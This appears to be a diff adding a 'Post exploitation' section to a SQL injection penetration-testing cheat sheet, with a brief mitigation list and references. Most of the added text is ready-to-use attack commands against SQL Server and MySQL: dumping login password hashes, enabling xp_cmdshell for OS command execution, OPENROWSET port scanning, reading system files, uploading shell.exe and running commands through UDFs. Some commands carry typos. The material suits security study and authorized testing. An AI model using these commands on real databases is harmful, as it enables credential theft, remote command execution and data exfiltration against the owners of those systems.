@@ -467,6 +467,101 @@ sqlmap -u <TARGET> --suffix "'));'
 --technique
 ```
 
+# Post exploitation
+
+```
+SELECT name, password FROM master..sysxlogins
+SELECT name, password_hash FROM master.sys.sql_logins
+EXEC master..xp_cmdshell '<command>' # sa user
+```
+
+### Enable sa user
+
+```
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+### Disable sa user
+
+```
+EXEC sp_configure 'xp_cmdshell', 0;
+EXEC sp_configure 'show advanced options', 0;
+RECONFIGURE;
+```
+
+### Ping
+
+```
+EXEC master.dbo.xp_cmdshell 'ping <target>'
+```
+
+This does not return a result and you must infer the success by comparing it with a failed ping.
+
+MS ping utility sends four ICMP echo requests which means that pinging a lie host takes 5-8 seconds. Pinging a non-existant host takes 20-30 seconds
+
+### OPENROWSET port scanner
+
+OPENROWSET is SQL Server method you can user to access the tables of a remote server. It needs an IP address and a port to connect too. It can be mis-used as a port scanner...
+
+```
+SELECT * from OPENROWSET('SQLOLEDB',
+'uid=sa;pwd=something;Network=DMSSOCN;Address=<target>,<port>;timeout=<timeout in seconds', 'select 1') --
+```
+
+* port closed message: `SQL Server does not exist` or `access denied`
+* port open messages: `General network error. Check your network documentation`
+
+If errors are hidden, and the port is closed the connection will timeout according the timeout value specified above.
+
+### Read the filesystem
+
+Save the directory listing to a file.
+
+```
+EXEC master..xp_cmdshell 'dir c:\ > C:\some\public\folder\out.txt'--
+
+SELECT LOAD_FILE('<text file path');
+SELECT HEX(LOAD_FILE('<text file path'));
+
+CREATE TABLE temptable(output longtext);
+LOAD DATA INFILE '/etc/password' INTO TABLE temptable FIELDS
+TERMINATED BY '\n' (output);
+SELECT <fields> FROM <table> INTO DUMPFILE '<output path>'
+```
+
+Save the output to a table then read it.
+
+```
+CREATE TABLE filecontent(line varchar(8000));
+BULK INSERT filecontent FROM '<target file>''
+# remember to drop the table after extraction
+# DROP TABLE filecontent;
+```
+
+### upload a file (w. advanced MSSQL features)
+
+Get the database to connect to our database and recreate `shell.exe` on the victims database...
+
+```
+CREATE TABLE HelperTable (file text)
+BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')
+EXEC xp_cmdshell 'bcp "SELECT * FROM HelperTable" queryout shell.exe -c -Craw -S<server> -U<server username> -P<server password>'
+```
+
+### User defined functions (UDF)
+
+* sys_eval(<command>)
+* sys_exec(<command>)
+
+```
+SLEECT sys_eval('<command>');
+SELECT sys_excec('<command>');
+```
+* see sqlmap ``--os-cmd` and ``--os-shell`
+
 =====================================================
 
 # Mitigation strategies
@@ -479,3 +574,18 @@ SQLi vulnerabilities are input validation vulnerabilities and can be prevented b
 * use prepared statement
 * perform type casting
 * white-list based validation
+
+# References
+
+* http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+* https://members.elearnsecurity.com/course/resources/name/wapt_v2_section_1_module_5_attachment_AppsecEU09-Damele-A-G-Advanced-SQL-injection-slides
+* https://members.elearnsecurity.com/course/resources/name/wapt_v2_section_1_module_5_attachment_bu-win-03-cerrudo-notes
+* https://msdn.microsoft.com/en-us/library/ms187837.aspx
+* https://msdn.microsoft.com/en-us/library/ms187837.aspx
+* http://www.amazon.com/The-Web-Application-Hackers-Handbook/dp/1118026470
+* http://www.amazon.com/Injection-Attacks-Defense-Second-Edition/dp/1597499633
+* http://www.w3schools.com/sql/sql_intro.asp
+* https://dev.mysql.com/doc/refman/5.1/en/privileges-provided.html#priv_file
+* https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html
+* https://github.com/sqlmapproject/sqlmap/tree/master/udf/mysql
+* http://www.mysqludf.org/
